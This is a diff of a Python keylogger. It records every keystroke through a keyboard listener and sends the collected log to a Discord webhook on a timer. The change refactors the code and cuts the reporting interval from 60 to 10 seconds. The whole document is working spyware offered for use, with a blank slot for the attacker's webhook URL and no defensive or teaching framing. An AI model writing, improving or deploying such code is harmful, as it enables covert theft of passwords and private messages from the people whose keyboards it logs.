@@ -3,42 +3,31 @@ from threading import Timer
 from dhooks import Webhook
 
 
-WEBHOOK_URL = ""  # Put here your discord webhook url.
-INTERVAL = 60  # You'll get the info every 60 seconds.
+WEBHOOK_URL = ""  # Your discord webhook url goes here.
+TIME_INTERVAL = 10  # You can set the amount of time between each report
 
 
 class Keylogger:
-    def __init__(self, WB_URL, interval=60):
-        self.WB_URL = WB_URL
+    def __init__(self, wb_url, interval=60):
+        self.wb_url = wb_url
         self.interval = interval
+        self.webhook = Webhook(self.wb_url)
         self.log = ""
-
-    def _send_info(self, log):
-        if log != "":
-            webhook = Webhook(self.WB_URL)
-            webhook.send(log)
-
-    def _key_down(self, key):
-        key = str(key).replace("'", "")
-        key = " " if key == "Key.space" else key
-        key = "\n" if key == "Key.enter" else key
-
-        if key == "Key.backspace":
-            self.log = self.log[:len(self.log)-1]
-            key = ""
-            
-        self.log += key
 
     def _report(self):
-        self._send_info(self.log)
-        self.log = ""
+        if self.log != "":
+            self.webhook.send(self.log)
+            self.log = ""
         Timer(self.interval, self._report).start()
+
+    def _on_key_press(self, key):
+        self.log += str(key)
 
     def run(self):
         self._report()
-        with Listener(self._key_down) as c:
-            c.join()
+        with Listener(self._on_key_press) as t:
+            t.join()
 
 
 if __name__ == '__main__':
-    Keylogger(WEBHOOK_URL, INTERVAL).run()
+    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()
